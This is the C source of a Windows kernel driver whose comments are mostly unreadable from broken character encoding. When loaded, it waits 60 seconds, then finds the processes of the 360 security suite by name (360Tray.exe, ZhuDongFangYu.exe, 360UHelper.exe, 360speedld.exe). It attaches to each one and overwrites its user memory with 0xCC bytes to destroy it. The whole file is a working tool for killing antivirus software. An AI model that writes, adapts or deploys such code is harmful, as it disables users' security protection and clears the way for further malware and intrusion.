
#include <ntifs.h>

///	�ں˺�������
NTKERNELAPI
VOID
KeAttachProcess(
IN PRKPROCESS Process
);

NTKERNELAPI
VOID
KeDetachProcess(
VOID
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationProcess(
__in HANDLE ProcessHandle,
__in PROCESSINFOCLASS ProcessInformationClass,
__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
__in ULONG ProcessInformationLength,
__out_opt PULONG ReturnLength
);



////	�ṹ��
//PED��PTE�Ľṹ

//����PAE��
typedef struct _MMPTE_HARDWARE_PAE {
	ULONGLONG Valid : 1;
	ULONGLONG Write : 1;        // UP version
	ULONGLONG Owner : 1;
	ULONGLONG WriteThrough : 1;
	ULONGLONG CacheDisable : 1;
	ULONGLONG Accessed : 1;
	ULONGLONG Dirty : 1;
	ULONGLONG LargePage : 1;
	ULONGLONG Global : 1;
	ULONGLONG CopyOnWrite : 1; // software field
	ULONGLONG Prototype : 1;   // software field
	ULONGLONG reserved0 : 1;  // software field
	ULONGLONG PageFrameNumber : 24;
	ULONGLONG reserved1 : 28;  // software field
} MMPTE_HARDWARE_PAE, *PMMPTE_HARDWARE_PAE;

typedef struct _MMPTE_PAE {
	union  {
		MMPTE_HARDWARE_PAE Hard;
	} u;
} MMPTE_PAE, *PMMPTE_PAE;

//δ����PAE��
typedef struct _MMPTE_HARDWARE {
	ULONG Valid : 1;
	ULONG Write : 1;       // UP version
	ULONG Owner : 1;
	ULONG WriteThrough : 1;
	ULONG CacheDisable : 1;
	ULONG Accessed : 1;
	ULONG Dirty : 1;
	ULONG LargePage : 1;
	ULONG Global : 1;
	ULONG CopyOnWrite : 1; // software field
	ULONG Prototype : 1;   // software field
	ULONG reserved : 1;    // software field
	ULONG PageFrameNumber : 20;
} MMPTE_HARDWARE, *PMMPTE_HARDWARE;

typedef struct _MMPTE {
	union  {
		MMPTE_HARDWARE Hard;
	} u;
} MMPTE, *PMMPTE;



////	��
//���PDE��PTE

#define PTE_BASE    0xC0000000
#define PDE_BASE    0xC0300000
#define PDE_BASE_PAE 0xc0600000

//����PAE��
#define MiGetPdeAddressPae(va)   ((PMMPTE_PAE)(PDE_BASE_PAE + ((((ULONG)(va)) >> 21) << 3)))
#define MiGetPteAddressPae(va)   ((PMMPTE_PAE)(PTE_BASE + ((((ULONG)(va)) >> 12) << 3)))

//δ����PAE��
#define MiGetPdeAddress(va)  ((MMPTE*)(((((ULONG)(va)) >> 22) << 2) + PDE_BASE))
#define MiGetPteAddress(va) ((MMPTE*)(((((ULONG)(va)) >> 12) << 2) + PTE_BASE))

//win7 32λ��ActiveProcessLinks��ƫ��
#define  ActiveProcessLinksOffset 0xB8
//��������С
#define  ProcessNameSize 0x260 
//Ŀ�������
//Tray��ʱ���Сд
#define TargetProNameTarap L"360Tray.exe"
#define TargetProNametarap L"360tray.exe"
#define TargetProNameZDFY L"ZhuDongFangYu.exe"
#define TargetProNameHel L"360UHelper.exe"
#define TargetProNamesee L"360speedld.exe"


//����PAE��
ULONG MmIsAddressValidExPae(
	IN PVOID Pointer
	)
{
	MMPTE_PAE* Pde;
	MMPTE_PAE* Pte;

	Pde = MiGetPdeAddressPae(Pointer);

	if (Pde->u.Hard.Valid)
	{
		//�ж�PDE��ҳ���
		if (Pde->u.Hard.LargePage != 0)		
		{
			Pte = Pde;
		}
		else
		{
			Pte = MiGetPteAddressPae(Pointer);
		}

		if (Pte->u.Hard.Valid)
		{
			return TRUE;
		}
	}
	return FALSE;
}


//δ����PAE��
ULONG MmIsAddressValidExNotPae(
	IN PVOID Pointer
	)
{
	MMPTE* Pde;
	MMPTE* Pte;

	Pde = MiGetPdeAddress(Pointer);

	if (Pde->u.Hard.Valid)
	{
		Pte = MiGetPteAddress(Pointer);

		if (Pte->u.Hard.Valid)
		{
			return TRUE;
		}

		//Դ�����PDE��ҳ���
	}

	return FALSE;
}



//�жϵ�ַ�Ƿ���Ч
ULONG MiIsAddressValidEx(
	IN PVOID Pointer
	)
{
	//��ַΪ������Ч
	if (!ARGUMENT_PRESENT(Pointer) ||
		!Pointer){
		return FALSE;
	}

	//// ҳ����
	//����Ƿ���PAE
	ULONG uCR4 = 0;
	_asm{
		// mov eax, cr4
		__asm _emit 0x0F __asm _emit 0x20 __asm _emit 0xE0;
		mov uCR4, eax;
	}
	if (uCR4 & 0x20) {
		return MmIsAddressValidExPae(Pointer);
	}
	else {
		return MmIsAddressValidExNotPae(Pointer);
	}

	return TRUE;

	//�˺������� ͬʱ�ж��ں˶����ַ�Ƿ���Ч��
	//����ĵ�ַҲ��һ��ҳ���ַ��

}



//ZeroProcessMemory���ƻ����̿ռ�
BOOLEAN ZeroProcessMemory(ULONG EProcess)
{
	ULONG ulVirtualAddr;
	BOOLEAN b_OK = FALSE;
	PVOID OverlayBuf = NULL;

	//��������0xcc�ĸ��ǿռ�
	OverlayBuf = ExAllocatePool(NonPagedPool, 0x1024);
	if (!OverlayBuf){
		return FALSE;
	}

	memset(OverlayBuf, 0xcc, 0x1024);

	//Attach��Ŀ�����
	KeAttachProcess((PEPROCESS)EProcess); 

	//ѭ�������̿ռ�
	for (ulVirtualAddr = 0; ulVirtualAddr <= 0x7fffffff; ulVirtualAddr += 0x1024)
	{
		if (MiIsAddressValidEx((PVOID)ulVirtualAddr))
		{
			__try
			{
				//����д���׳��쳣
				ProbeForWrite((PVOID)ulVirtualAddr, 0x1024, sizeof(ULONG));
				RtlCopyMemory((PVOID)ulVirtualAddr, OverlayBuf, 0x1024);
				b_OK = TRUE;
			}
			__except (EXCEPTION_EXECUTE_HANDLER){
				continue;
			}
		}
		else{
			if (ulVirtualAddr > 0x1000000)  //����ô���㹻�ƻ�����������
				break;
		}
	}

	//�˳�������̵Ŀռ�
	KeDetachProcess();

	//�ͷ�������ڴ�
	ExFreePool(OverlayBuf);

	////��֤���Ƿ�������������
	//���ַ��������ɿ�
	//Status = ObOpenObjectByPointer(
	//	(PEPROCESS)EProcess,
	//	OBJ_KERNEL_HANDLE,
	//	0,
	//	GENERIC_READ,
	//	NULL,
	//	KernelMode,
	//	&ProcessHandle
	//	);

	////���̻����ڣ�����ʧ��
	//if (NT_SUCCESS(Status)){
	//	ZwClose(ProcessHandle);
	//	b_OK = FALSE;
	//}


	return b_OK;
}


//·�����������ļ���
void splitname(const PWCHAR szPath,PWCHAR * szfilename)
{
	//�Ӻ��������ļ���

	ULONG i;

	i = 0;
	
	i = wcslen(szPath); 

	while (szPath[i] != (WCHAR)'\\')
		i--;

	i++;


	*szfilename = (PWCHAR)((ULONG)szPath + (i*2));
}


//ͨ����������������
PEPROCESS GetEProcessByName(PUNICODE_STRING _ProcessName)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	HANDLE hPro = NULL;
	PEPROCESS FounPro = NULL;

	//��ϵͳ���̿�ʼ����
	PEPROCESS eProces = (PEPROCESS)IoGetCurrentProcess();

	//����ͷ���
	PLIST_ENTRY ListHead = (PLIST_ENTRY)((ULONG)eProces + ActiveProcessLinksOffset);
	//��һ���
	PLIST_ENTRY Entry = ListHead->Flink;

	PUNICODE_STRING pPath = (PUNICODE_STRING)ExAllocatePool(NonPagedPool, ProcessNameSize);
	
	while (Entry != ListHead)
	{
		FounPro = (PEPROCESS)((ULONG)Entry - ActiveProcessLinksOffset);

		Entry = Entry->Flink;
		if (Entry == NULL)
		{
			KdPrint(("�������� \n"));
			break;
		}

		__try
		{

			RtlZeroMemory(pPath, ProcessNameSize);

			////��ȡ�ȶ��Ľ�����
			st = ObOpenObjectByPointer(FounPro, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &hPro);
			if (!NT_SUCCESS(st))
			{
				FounPro = NULL;
				break;
			}

			ULONG OutSize = 0;
			st = ZwQueryInformationProcess(hPro, ProcessImageFileName, pPath, ProcessNameSize, &OutSize);
			if (!NT_SUCCESS(st))
			{
				FounPro = NULL;
				break;
			}

			//����·�����ļ���
			PWCHAR ProName = NULL;
			splitname(pPath->Buffer, &ProName);

			KdPrint((("��������%ws \n"), ProName));

			if (!wcscmp(_ProcessName->Buffer, ProName))
			{
				KdPrint(("�ҵ��� \n"));
				break;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			FounPro = NULL;
			continue;
		}

		FounPro = NULL;
	}

	ZwClose(hPro);
	ExFreePool(pPath);
	ObDereferenceObject(eProces);

	return FounPro;
}


////�жϽ����Ƿ���Ч
//����A-Protect��Դ�룬�������Բ����ɿ�
//BOOLEAN IsExitProcess(PEPROCESS Eprocess)
//{
//	ULONG SectionObjectOffset = NULL;
//	ULONG SegmentOffset = NULL;
//	ULONG SectionObject;
//	ULONG Segment;
//	BOOLEAN b_OK = FALSE;
//
//	__try
//	{
//		//��������Win7 7000 ����ֱ�Ӽ�ƫ��
//
//		if (MmIsAddressValidExPae(((ULONG)Eprocess + 0x128))){
//				SectionObject = *(PULONG)((ULONG)Eprocess + 0x128);
//
//				if (MmIsAddressValidExPae(((ULONG)SectionObject + 0x14))){
//					Segment = *(PULONG)((ULONG)SectionObject + 0x14);
//
//					if (MmIsAddressValidExPae(Segment)){
//						b_OK = TRUE;  //��������Ч��
//						__leave;
//					}
//				}
//			}
//		}
//	
//	__except (EXCEPTION_EXECUTE_HANDLER){
//		//�����쳣
//	}
//	return b_OK;
//
//	//�����ԣ����ַ�ʽ���ɿ�����Ϊ��Щ�����̵��ڴ����ΪNULL��
//}

////DPC�ص�
//�ѷ�
//VOID DpcForTimer(IN struct _KDPC  *Dpc, IN PVOID  DeferredContext,
//	IN PVOID  SystemArgument1, IN PVOID  SystemArgument2)
//{
//	UNREFERENCED_PARAMETER(Dpc);
//	UNREFERENCED_PARAMETER(DeferredContext);
//	UNREFERENCED_PARAMETER(SystemArgument1);
//	UNREFERENCED_PARAMETER(SystemArgument2);
//
//	_asm int 3;
//	//360Trap
//	GetProNameToKillProcess(TargetProNameTarap);
//
//	//360trap
//	GetProNameToKillProcess(TargetProNametarap);
//
//	//ZhuDongFangYu
//	GetProNameToKillProcess(TargetProNameZDFY);
//
//	//360UHelper.exe
//	GetProNameToKillProcess(TargetProNameHel);
//}

BOOLEAN GetProNameToKillProcess(PWCHAR ProName)
{
	//���ݽ������õ�EPROCESS
	UNICODE_STRING UName = RTL_CONSTANT_STRING(ProName);
	PEPROCESS eProcess = GetEProcessByName(&UName);
	if (eProcess != NULL)
	{
		if (ZeroProcessMemory((ULONG)eProcess))		//	�ƻ����̿ռ�
		{
			KdPrint((("�ɹ��ɵ� %ws \n"), ProName));
			return TRUE;
		}
	}
	return FALSE;
}

//�����̵߳ȴ�
NTSTATUS ThreadProc()
{
	//�ȴ�360��ؽ��̴���  60��
	//ʱ�任��
	LARGE_INTEGER interval;
	interval.QuadPart = (-10 * 1000);
	interval.QuadPart *= 1000 * 60;
	KeDelayExecutionThread(KernelMode, FALSE, &interval);

		//_asm int 3;

		//360UHelper.exe
		GetProNameToKillProcess(TargetProNameHel);

		//360UHelper.exe
		GetProNameToKillProcess(TargetProNamesee);

		//ZhuDongFangYu
		GetProNameToKillProcess(TargetProNameZDFY);

		//360Trap
		GetProNameToKillProcess(TargetProNameTarap);
	
		//360trap
		GetProNameToKillProcess(TargetProNametarap);
	
	// �˳��߳�   
	PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS UnLoadDriver(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegisterPath)
{
	UNREFERENCED_PARAMETER(RegisterPath);
	DriverObject->DriverUnload = UnLoadDriver;

	//��ӡ��Ϣ
	//_asm int 3;
	KdPrint(("�ɹ��ƹ���������"));


	////�ȴ�360��ؽ��̴���  60��
	////ʱ�任��
	//�����
	//LARGE_INTEGER interval;
	//interval.QuadPart = (-10 * 1000);
	//interval.QuadPart *= 1000 * 60;
	//KeDelayExecutionThread(KernelMode, FALSE, &interval);

	//////�ȴ�360��ؽ��̴���  60��
	////����DPC��ʱ��
	////��DPC������IRQL����ʹ��ObOpenObjectByPointer�Ⱥ�����
	//PKTIMER pktimer = (PKTIMER)ExAllocatePoolWithTag(NonPagedPool, sizeof(KTIMER), 'RM');
	//PKDPC pKdpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KDPC), 'RM');
	//KeInitializeDpc(pKdpc, (PKDEFERRED_ROUTINE)DpcForTimer, NULL);
	//KeInitializeTimerEx(pktimer, NotificationTimer);
	//
	//LARGE_INTEGER settime = { 0 };
	//settime.QuadPart = 60 * 1000000 * -10;
	//KeSetTimer(pktimer, settime, pKdpc);

	//�ȴ�360��ؽ��̴���  60��
	//�����̲߳��ȴ�
	HANDLE hThread = NULL;
	PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, ThreadProc, NULL);
	
	ZwClose(hThread);
	return STATUS_SUCCESS;
}